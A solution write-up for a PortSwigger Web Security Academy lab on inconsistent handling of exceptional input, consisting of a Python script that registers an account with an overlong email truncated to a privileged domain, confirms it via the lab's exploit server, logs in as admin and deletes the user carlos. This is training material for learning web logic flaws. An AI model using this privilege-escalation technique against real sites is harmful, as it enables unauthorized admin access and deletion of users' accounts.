# Lab: Inconsistent handling of exceptional input

Link to lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input

## Solution

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

sess = requests.Session()

# Get register

response = requests.get('https://0a980043042bdca9c1ba360400690045.web-security-academy.net/register')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Post register

cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'a',
    'email': 'mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm@dontwannacry.com.exploit-0a9600890419dc4cc13d35cd019700fc.exploit-server.net',
    'password': 'a',
}

response = requests.post(
    'https://0a980043042bdca9c1ba360400690045.web-security-academy.net/register',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

# Get link from email

response = requests.get(
    'https://exploit-0a9600890419dc4cc13d35cd019700fc.exploit-server.net/email',
    verify=False,
)
soup = BeautifulSoup(response.text, 'html.parser')
link = soup.find_all('a')[3]['href']

# Get link to confirm register

response = requests.get(
    link,
    cookies=cookies,
    verify=False,
)

# Get login

response = requests.get(
    'https://0a980043042bdca9c1ba360400690045.web-security-academy.net/register',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']


# Post login

data = {
    'csrf': csrf,
    'username': 'a',
    'password': 'a',
}

response = requests.post(
    'https://0a980043042bdca9c1ba360400690045.web-security-academy.net/login',
    data=data,
    cookies=cookies,
    allow_redirects=False,
    verify=False,
    )
session = response.headers['set-Cookie'].split(';')[0].split('=')[1]


# Delete user carlos

cookies = {
    'session': session,
}

response = requests.get(
    'https://0a980043042bdca9c1ba360400690045.web-security-academy.net/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)
```